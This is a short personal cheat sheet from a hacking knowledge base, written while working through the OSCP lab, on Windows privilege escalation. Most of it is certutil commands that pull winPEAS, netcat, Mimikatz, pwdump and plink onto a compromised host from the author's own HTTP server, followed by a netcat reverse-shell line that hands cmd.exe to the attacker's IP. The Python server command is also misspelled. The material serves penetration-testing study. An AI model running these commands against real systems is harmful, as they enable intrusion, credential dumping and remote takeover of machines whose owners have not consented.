---
{"dg-publish":true,"dg-path":"Garden/knowledge-base/hacking/privilege escalation/windows/Windows files.md","permalink":"/garden/knowledge-base/hacking/privilege-escalation/windows/windows-files/","created":"2024-05-19 18:07","updated":"2026-03-08 20:46"}
---

# Windows files

home: [[02-Area/hacking/Hacking\|Hacking]]

These are the commands I always copy paste while working through the OSCP lab.

I host the files using `python3 -m simple.httpserver 80`

```cmd
certutil -urlcache -split -f http://10.10.14.23/privesc/win/winpeas64.exe win.exe

certutil -urlcache -split -f http://192.168.119.176/shell/nc.exe

certutil -urlcache -split -f http://192.168.119.176/privesc/win/winpeas64.exe win.exe
certutil -urlcache -split -f http://192.168.119.176/privesc/win/winpeas32.exe win.exe
certutil -urlcache -split -f http://192.168.119.176/privesc/win/winpeas.bat win.bat

certutil -urlcache -split -f http://192.168.119.176/post/Invoke-Mimikatz.ps1
certutil -urlcache -split -f http://192.168.119.176/post/mimikatz64.exe mimi.exe
certutil -urlcache -split -f http://192.168.119.176/post/mimikatz32.exe mimi.exe
certutil -urlcache -split -f http://192.168.119.176/post/pwdump8.exe pwdump.exe

certutil -urlcache -split -f http://192.168.119.176/post/plink64.exe plink.exe

certutil -urlcache -split -f http://192.168.119.176/privesc/win/sysinternal/accesschk.exe
certutil -urlcache -split -f http://192.168.119.176/privesc/win/sysinternal/accesschk64.exe
```

```cmd
start /b nc.exe 192.168.119.176 443 -e cmd.exe

```

This actually leads me to create this tool called [the-c0d3r/htb-scripts/srvfile](https://github.com/the-c0d3r/htb-scripts/blob/master/srvfile) to automate this process of editing the IP address every single time I want to copy paste to my remote terminal to have the files downloaded to the compromised machine.